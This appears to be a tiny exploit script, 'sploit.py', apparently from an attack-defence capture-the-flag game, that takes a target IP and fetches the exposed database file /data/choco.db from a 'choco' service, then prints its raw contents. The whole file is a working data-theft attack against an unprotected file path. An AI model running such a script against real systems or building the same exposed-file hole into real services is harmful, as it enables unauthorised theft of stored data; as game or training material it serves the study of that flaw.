import sys
import requests
from choco_lib import *

if len(sys.argv) < 2:
	print('Usage: python3 sploit.py ip')
	exit(0)

ip = sys.argv[1]

r = requests.get(f'http://{ip}:{PORT}/data/choco.db')
print(r.content, flush=True)
